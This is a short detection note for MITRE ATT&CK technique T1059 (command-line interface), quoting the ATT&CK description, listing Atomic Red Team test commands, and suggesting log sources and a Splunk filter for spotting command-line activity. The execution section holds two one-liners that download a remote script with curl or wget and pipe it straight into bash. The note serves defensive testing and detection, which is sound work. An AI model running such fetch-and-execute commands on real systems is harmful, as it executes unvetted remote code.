# T1059 - Command-Line Interface
## [Description from ATT&CK](https://attack.mitre.org/wiki/Technique/T1059)
<blockquote>Command-line interfaces provide a way of interacting with computer systems and is a common feature across many types of operating system platforms. (Citation: Wikipedia Command-Line Interface) One example command-line interface on Windows systems is [cmd](https://attack.mitre.org/software/S0106), which can be used to perform a number of tasks including execution of other software. Command-line interfaces can be interacted with locally or remotely via a remote desktop application, reverse shell session, etc. Commands that are executed run with the current permission level of the command-line interface process unless the command includes process invocation that changes permissions context for that execution (e.g. [Scheduled Task](https://attack.mitre.org/techniques/T1053)).

Adversaries may use command-line interfaces to interact with systems and execute other software during the course of an operation.</blockquote>

## Assumptions
Attacker or local user has access to command propmpt or powershell

## Execution:
[Test using Atomic Red Team](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059/T1059.md)

<blockquote>
bash -c "curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh | bash"
bash -c "wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Atomics/T1059/echo-art-fish.sh | bash"
</blockquote>

or any commandline or powershel command

## Detection:
* Monitor CommandLine activity (including powershell)
* [Read Mitre ATT&CK for more Detection info](https://attack.mitre.org/wiki/Technique/T1059)

### Visibility
* Windows event log
* Enable Commandline audit
* Command line / Powershell activity

### Filter / Correlation in Splunk
Following catch both comandline and powershell, although they can be separated in two. 

```
"CommandLine:*"
```
